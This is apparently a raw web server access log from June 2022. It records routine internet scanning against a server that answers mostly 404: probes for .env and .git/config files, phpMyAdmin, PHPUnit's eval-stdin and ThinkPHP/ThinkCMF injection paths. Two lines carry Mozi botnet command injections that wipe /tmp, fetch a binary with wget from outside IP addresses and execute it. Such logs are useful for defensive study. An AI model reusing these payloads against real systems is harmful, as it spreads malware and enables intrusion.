::1 - - [29/Jun/2022:00:05:53 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://112.95.92.74:33693/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 404 144 "-" "Hello, world"
::ffff:127.0.0.1 - - [29/Jun/2022:00:13:00 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:01:57:32 +0000] "GET / HTTP/1.0" 404 139 "-" "python-requests/2.28.0"
::1 - - [29/Jun/2022:02:03:14 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:02:05:41 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Jun/2022:02:05:42 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:03:08:12 +0000] "GET /.git/config HTTP/1.0" 404 150 "-" "Mozilla/5.0 (iPad; CPU OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/79.0.259819395 Mobile/17A5556d Safari/604.1"
::1 - - [29/Jun/2022:03:50:02 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [29/Jun/2022:04:03:22 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 189 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:04:23:11 +0000] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.0" 404 182 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::1 - - [29/Jun/2022:04:42:21 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:04:44:34 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::1 - - [29/Jun/2022:04:44:37 +0000] "GET / HTTP/1.0" 404 139 "http://159.223.82.71:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:127.0.0.1 - - [29/Jun/2022:04:48:20 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
::1 - - [29/Jun/2022:05:06:15 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:05:06:16 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Jun/2022:05:16:31 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:05:16:44 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [29/Jun/2022:05:50:40 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.54.216.138:49880/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:127.0.0.1 - - [29/Jun/2022:06:01:19 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [29/Jun/2022:06:14:43 +0000] "GET / HTTP/1.0" 404 139 "-" "'Mozilla/5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:06:40:55 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [29/Jun/2022:07:26:01 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:07:26:04 +0000] "GET /console/ HTTP/1.0" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [29/Jun/2022:07:41:50 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:08:05:45 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Jun/2022:08:05:46 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:08:17:31 +0000] "HEAD /phpmyadmin/ HTTP/1.0" 404 151 "-" "revolt"
::1 - - [29/Jun/2022:08:17:31 +0000] "HEAD /phpMyadmin/ HTTP/1.0" 404 151 "-" "revolt"
::ffff:127.0.0.1 - - [29/Jun/2022:08:17:31 +0000] "HEAD /phpMyAdmin/ HTTP/1.0" 404 151 "-" "revolt"
::1 - - [29/Jun/2022:08:17:31 +0000] "HEAD /phpmyAdmin/ HTTP/1.0" 404 151 "-" "revolt"
::ffff:127.0.0.1 - - [29/Jun/2022:08:17:31 +0000] "HEAD /phpMyAdmin/index.php HTTP/1.0" 404 160 "-" "revolt"
::1 - - [29/Jun/2022:08:17:31 +0000] "HEAD /phpmyadmin/index.php HTTP/1.0" 404 160 "-" "revolt"
::ffff:127.0.0.1 - - [29/Jun/2022:08:28:00 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [29/Jun/2022:08:38:42 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36"
::1 - - [29/Jun/2022:08:40:45 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:40:45 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:40:45 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:41:36 +0000] "GET /.git/config HTTP/1.0" 404 150 "-" "python-requests/2.25.1"
